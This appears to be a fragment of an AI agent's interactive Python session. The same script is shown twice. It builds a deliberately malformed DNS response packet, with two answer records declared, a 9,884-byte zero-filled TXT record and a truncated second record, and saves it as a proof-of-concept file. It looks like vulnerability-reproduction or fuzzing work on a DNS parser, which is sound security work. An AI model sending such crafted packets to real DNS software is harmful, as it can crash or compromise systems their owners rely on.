Running Python code interactively: import struct

# DNS packet header
id_field = 0x0000
flags = 0x0000
qdcount = 0  # no questions
ancount = 2  # two answers
nscount = 0
arcount = 0

header = struct.pack('>HHHHHH', id_field, flags, qdcount, ancount, nscount, arcount)

# First answer record name: "a." encoded as \x01a\x00
name1 = b'\x01a\x00'

# First answer record: type=TXT(16), class=IN(1), ttl=0, rdlength=9884
type1 = 16  # TXT
class1 = 1  # IN
ttl1 = 0
rdlength1 = 9884

rr1_header = struct.pack('>HHIH', type1, class1, ttl1, rdlength1)

# First answer rdata: 9884 bytes of zeros
rdata1 = b'\x00' * rdlength1

# Second answer record name: "\x01b\x00" - single label 'b'
name2 = b'\x01b\x00'

# Assemble the packet
packet = header + name1 + rr1_header + rdata1 + name2

print(f"Packet size: {len(packet)}")
print(f"Header: {len(header)} bytes")
print(f"Name1 starts at offset: {len(header)}")
print(f"RR1 header starts at: {len(header) + len(name1)}")
print(f"RData1 starts at: {len(header) + len(name1) + len(rr1_header)}")
print(f"Name2 starts at: {len(header) + len(name1) + len(rr1_header) + len(rdata1)}")

# Write the PoC
with open('/workspace/poc.bin', 'wb') as f:
    f.write(packet)

print(f"\nPoC written: {len(packet)} bytes")

import struct

# DNS packet header
id_field = 0x0000
flags = 0x0000
qdcount = 0  # no questions
ancount = 2  # two answers
nscount = 0
arcount = 0

header = struct.pack('>HHHHHH', id_field, flags, qdcount, ancount, nscount, arcount)

# First answer record name: "a." encoded as \x01a\x00
name1 = b'\x01a\x00'

# First answer record: type=TXT(16), class=IN(1), ttl=0, rdlength=9884
type1 = 16  # TXT
class1 = 1  # IN
ttl1 = 0
rdlength1 = 9884

rr1_header = struct.pack('>HHIH', type1, class1, ttl1, rdlength1)

# First answer rdata: 9884 bytes of zeros
rdata1 = b'\x00' * rdlength1

# Second answer record name: "\x01b\x00" - single label 'b'
name2 = b'\x01b\x00'

# Assemble the packet
packet = header + name1 + rr1_header + rdata1 + name2

print(f"Packet size: {len(packet)}")
print(f"Header: {len(header)} bytes")
print(f"Name1 starts at offset: {len(header)}")
print(f"RR1 header starts at: {len(header) + len(name1)}")
print(f"RData1 starts at: {len(header) + len(name1) + len(rr1_header)}")
print(f"Name2 starts at: {len(header) + len(name1) + len(rr1_header) + len(rdata1)}")

# Write the PoC
with open('/workspace/poc.bin', 'wb') as f:
    f.write(packet)

print(f"\nPoC written: {len(packet)} bytes")
